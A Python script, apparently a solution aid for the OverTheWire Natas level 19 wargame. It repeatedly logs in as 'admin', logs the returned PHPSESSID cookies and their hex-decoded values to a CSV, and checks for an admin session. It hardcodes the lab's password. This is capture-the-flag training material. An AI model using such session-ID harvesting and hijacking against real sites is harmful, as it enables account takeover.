import requests
import tqdm
import csv
from pathlib import Path

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

auth = (username, password)

CURR_DIR = Path(__file__).absolute().parent

def add_to_file(username: str, session_id: str):
    with open(CURR_DIR / 'test.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([username, session_id, int(session_id, 16)])

def main():
    for i in tqdm.tqdm(range(0,100)):
        params = {'username': "admin", "password": "admin"}
        response = requests.get(url, params=params, auth=auth)
        add_to_file(f"{i}", response.cookies["PHPSESSID"])
        if response.status_code == 200:
            if "You are an admin" in response.text:
                print(f"admin session id is {i}")
                print(response.text) 
                exit(0)
            pass
        elif response.status_code != 200:
            print(f"status: {response.status_code}")
            raise RuntimeError("Error in query.")


if __name__ == "__main__":
    main()

